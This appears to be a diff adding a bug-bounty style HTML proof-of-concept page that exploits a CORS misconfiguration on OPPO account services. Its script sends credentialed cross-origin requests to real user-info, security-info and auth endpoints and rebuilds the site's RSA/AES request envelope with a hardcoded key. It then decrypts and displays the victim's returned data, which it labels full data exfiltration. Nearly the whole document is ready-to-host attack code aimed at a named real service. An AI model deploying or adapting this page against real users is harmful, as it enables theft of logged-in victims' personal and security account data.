@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>OPPO CORS PoC - 0xobsyn</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Courier New', monospace;
+      background: #0d1117;
+      color: #c9d1d9;
+      padding: 24px;
+    }
+    .card {
+      max-width: 860px;
+      margin: 0 auto;
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 24px;
+    }
+    h1 { color: #f85149; font-size: 1.4rem; margin-bottom: 4px; }
+    .meta { color: #8b949e; font-size: 0.82rem; margin-bottom: 20px; }
+    label { color: #8b949e; font-size: 0.8rem; display: block; margin-bottom: 4px; }
+    select, input[type=text] {
+      width: 100%;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      color: #c9d1d9;
+      padding: 8px 10px;
+      border-radius: 6px;
+      font-family: monospace;
+      font-size: 0.85rem;
+      margin-bottom: 12px;
+    }
+    .row { display: flex; gap: 12px; margin-bottom: 16px; }
+    .row > * { flex: 1; }
+    .btn {
+      display: inline-block;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      font-weight: 600;
+      margin-right: 8px;
+      margin-bottom: 16px;
+    }
+    .btn-red   { background: #da3633; color: #fff; }
+    .btn-green { background: #238636; color: #fff; }
+    .btn-clear { background: #30363d; color: #c9d1d9; }
+    .btn:hover { opacity: 0.85; }
+    #log {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 14px;
+      font-size: 0.78rem;
+      line-height: 1.7;
+      min-height: 120px;
+      max-height: 520px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .l-info    { color: #8b949e; }
+    .l-ok      { color: #3fb950; }
+    .l-warn    { color: #d29922; }
+    .l-err     { color: #f85149; }
+    .l-data    { color: #58a6ff; }
+    .l-head    { color: #bc8cff; font-weight: bold; }
+  </style>
+</head>
+<body>
+<div class="card">
+  <h1>⚡ OPPO Account — CORS PoC</h1>
+  <div class="meta">Attacker origin: <strong id="myOrigin"></strong> &nbsp;|&nbsp; Researcher: 0xobsyn</div>
+
+  <div class="row">
+    <div>
+      <label>Endpoint</label>
+      <select id="epSel" onchange="syncHost()">
+        <option value="/uc/web/v1/user-info/query-basic"   data-host="https://id-in.oppo.com">Basic User Info  (id-in.oppo.com)</option>
+        <option value="/uc/web/v1/user-info/security-info" data-host="https://id-in.oppo.com">Security Info    (id-in.oppo.com)</option>
+        <option value="/identity/web/v1/authn/auth"        data-host="https://id.oppo.com">Auth Endpoint    (id.oppo.com)</option>
+      </select>
+    </div>
+    <div>
+      <label>Host (auto-filled)</label>
+      <input type="text" id="host" value="https://id-in.oppo.com">
+    </div>
+  </div>
+
+  <button class="btn btn-red"   onclick="runSimple()">1️⃣  Simple CORS Check</button>
+  <button class="btn btn-green" onclick="runEncrypted()">2️⃣  Full Encrypted Attack</button>
+  <button class="btn btn-clear" onclick="clearLog()">Clear</button>
+
+  <div id="log"></div>
+</div>
+
+<script>
+// ── OPPO hardcoded 1024-bit RSA public key ──────────────────────────────────
+const OPPO_RSA_B64 =
+  "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDpgSW5VkZ6/xvh+wMXezrOok" +
+  "NdiupuvuMj4RVJy44byWDupl4H37z907A26RVdFzMeyLUQB4rsDIaXdxCODlljW" +
+  "W+/K96uF5MsDtOFUBw7VlOclIjcYTv/YDQEul8JoXoOuy1Yf3b5sbTpTuVTcl9" +
+  "7tAuLJ8PoGe2K7N3B1eUQqQIDAQAB";
+
+document.getElementById('myOrigin').textContent = window.location.origin;
+
+function syncHost() {
+  const sel = document.getElementById('epSel');
+  const opt = sel.options[sel.selectedIndex];
+  document.getElementById('host').value = opt.dataset.host;
+}
+
+// ── Logging ─────────────────────────────────────────────────────────────────
+function log(cls, msg) {
+  const el = document.getElementById('log');
+  const ts = new Date().toISOString().slice(11,23);
+  el.innerHTML += `<span class="l-${cls}">[${ts}] ${escHtml(msg)}</span>\n`;
+  el.scrollTop = el.scrollHeight;
+}
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+function clearLog() { document.getElementById('log').innerHTML = ''; }
+
+// ── Crypto helpers ───────────────────────────────────────────────────────────
+function randStr(n) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  const buf = new Uint8Array(n);
+  crypto.getRandomValues(buf);
+  return Array.from(buf).map(b => chars[b % 62]).join('');
+}
+
+async function rsaEncrypt(b64Key, plaintext) {
+  const der = Uint8Array.from(atob(b64Key), c => c.charCodeAt(0));
+  const key = await crypto.subtle.importKey(
+    'spki', der,
+    { name: 'RSA-OAEP', hash: 'SHA-1' },
+    false, ['encrypt']
+  );
+  const enc = new TextEncoder().encode(plaintext);
+  const buf = await crypto.subtle.encrypt({ name: 'RSA-OAEP' }, key, enc);
+  return btoa(String.fromCharCode(...new Uint8Array(buf)));
+}
+
+async function buildEnvelope(jsonBody) {
+  const aesKey = randStr(16);
+  const aesIv  = randStr(16);
+  const encKey = await rsaEncrypt(OPPO_RSA_B64, aesKey);
+  const encIv  = await rsaEncrypt(OPPO_RSA_B64, aesIv);
+  const encBody = CryptoJS.AES.encrypt(
+    CryptoJS.enc.Utf8.parse(jsonBody),
+    CryptoJS.enc.Utf8.parse(aesKey),
+    { mode: CryptoJS.mode.CBC, iv: CryptoJS.enc.Utf8.parse(aesIv), padding: CryptoJS.pad.Pkcs7 }
+  ).toString();
+  return { payload: `${encKey}.${encIv}.${encBody}`, aesKey, aesIv };
+}
+
+function aesDecrypt(cipher, aesKey, aesIv) {
+  return CryptoJS.AES.decrypt(
+    cipher,
+    CryptoJS.enc.Utf8.parse(aesKey),
+    { mode: CryptoJS.mode.CBC, iv: CryptoJS.enc.Utf8.parse(aesIv), padding: CryptoJS.pad.Pkcs7 }
+  ).toString(CryptoJS.enc.Utf8);
+}
+
+// ── Common response handler ──────────────────────────────────────────────────
+async function handleResponse(res, aesKey, aesIv) {
+  log('head', '── Response Headers ──');
+  const acao = res.headers.get('access-control-allow-origin');
+  const acac = res.headers.get('access-control-allow-credentials');
+  log('data', `Access-Control-Allow-Origin:      ${acao}`);
+  log('data', `Access-Control-Allow-Credentials: ${acac}`);
+  log('info', `HTTP Status: ${res.status}`);
+
+  const raw = await res.text();
+  log('head', '── Response Body (raw) ──');
+  log('data', raw.substring(0, 400) + (raw.length > 400 ? ' …[truncated]' : ''));
+
+  // CORS verdict
+  if (acao && acao !== 'null') {
+    log('ok', '✅  CORS CONFIRMED — browser exposed cross-origin response to this script!');
+    log('ok', `    Origin reflected: ${acao}  |  Credentials: ${acac}`);
+  }
+
+  // Try decryption if keys are available
+  if (aesKey && raw.length > 10) {
+    try {
+      const plain = aesDecrypt(raw, aesKey, aesIv);
+      if (plain && plain.trim().startsWith('{')) {
+        log('head', '── Decrypted Plaintext ──');
+        log('ok',   '🔓  FULL DATA EXFILTRATION CONFIRMED:');
+        log('data',  plain);
+      } else {
+        log('warn', 'Decryption returned non-JSON — server may apply extra wrapping.');
+        log('warn', 'Decrypted attempt: ' + plain.substring(0, 200));
+      }
+    } catch (e) {
+      log('warn', 'Decryption threw: ' + e.message);
+      log('warn', 'The raw response is still readable by this script (CORS confirmed).');
+    }
+  }
+}
+
+// ── Test 1: Simple check (no custom headers = no preflight for JSON body) ──
+async function runSimple() {
+  clearLog();
+  const ep   = document.getElementById('epSel').value;
+  const host = document.getElementById('host').value.trim();
+  const url  = host + ep;
+
+  log('info', `[Simple CORS Check]`);
+  log('info', `Target  : ${url}`);
+  log('info', `My origin (set by browser automatically): ${window.location.origin}`);
+  log('info', 'Sending POST with credentials:include, Content-Type: application/json …');
+
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({})
+    });
+    await handleResponse(res, null, null);
+  } catch (err) {
+    log('err', '❌ Fetch threw: ' + err.message);
+    log('err', 'Likely the browser blocked the request due to CORS — response NOT readable.');
+    log('warn', 'Check DevTools > Console and Network > CORS errors for details.');
+  }
+}
+
+// ── Test 2: Full encrypted attack ────────────────────────────────────────────
+async function runEncrypted() {
+  clearLog();
+  const ep   = document.getElementById('epSel').value;
+  const host = document.getElementById('host').value.trim();
+  const url  = host + ep;
+
+  log('info', '[Full Encrypted Attack — complete OPPO crypto chain]');
+  log('info', `Target: ${url}`);
+
+  try {
+    log('info', 'Generating ephemeral AES key + IV …');
+    const { payload, aesKey, aesIv } = await buildEnvelope(JSON.stringify({}));
+    log('ok',   `AES Key: ${aesKey}  |  IV: ${aesIv}`);
+    log('info', `Envelope (first 80 chars): ${payload.substring(0, 80)}…`);
+    log('info', 'Sending encrypted POST with credentials:include …');
+
+    const res = await fetch(url, {
+      method: 'POST',
+      credentials: 'include',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Envelope-Version': 'V1'
+      },
+      body: payload
+    });
+
+    await handleResponse(res, aesKey, aesIv);
+
+  } catch (err) {
+    log('err', '❌ Fetch threw: ' + err.message);
+    log('err', 'Browser blocked the response — CORS policy prevented reading.');
+    log('warn', 'Open DevTools > Console for the full CORS error message.');
+  }
+}
+</script>
+</body>
+</html>
